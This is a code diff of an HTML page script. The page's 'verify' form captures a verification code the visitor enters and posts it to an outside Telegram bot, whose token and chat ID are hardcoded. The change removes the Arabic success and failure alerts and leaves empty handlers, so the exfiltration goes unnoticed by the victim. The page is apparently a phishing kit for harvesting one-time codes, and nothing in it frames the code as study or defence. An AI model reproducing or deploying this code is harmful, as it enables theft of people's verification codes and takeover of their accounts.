@@ -18,30 +18,29 @@
 
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
   <script>
-    const TOKEN = "7589861351:AAE6GNf9_A48WllJYH123Ly1swEVs-q3mxU";
-    const CHAT_ID = "5008982957";
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+  const TOKEN = "7589861351:AAE6GNf9_A48WllJYH123Ly1swEVs-q3mxU";
+  const CHAT_ID = "5008982957";
+  const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    document.getElementById("verify-form").addEventListener("submit", function (e) {
-      e.preventDefault();
+  document.getElementById("verify-form").addEventListener("submit", function (e) {
+    e.preventDefault();
 
-      const code = document.getElementById("code").value;
+    const code = document.getElementById("code").value;
 
-      const message = `
+    const message = `
 <b>✅ Code Entered</b>\n
 <b>🔢 Code:</b> ${code}
-      `;
+    `;
 
-      axios.post(URI_API, {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: "html"
-      }).then(() => {
-        alert("✅ تم إرسال الرمز");
-      }).catch(() => {
-        alert("❌ فشل في الإرسال");
-      });
+    axios.post(URI_API, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "html"
+    }).then(() => {
+      // لا شيء عند النجاح
+    }).catch(() => {
+      // لا شيء عند الفشل
     });
-  </script>
-</body>
-</html>
+  });
+</script>
+
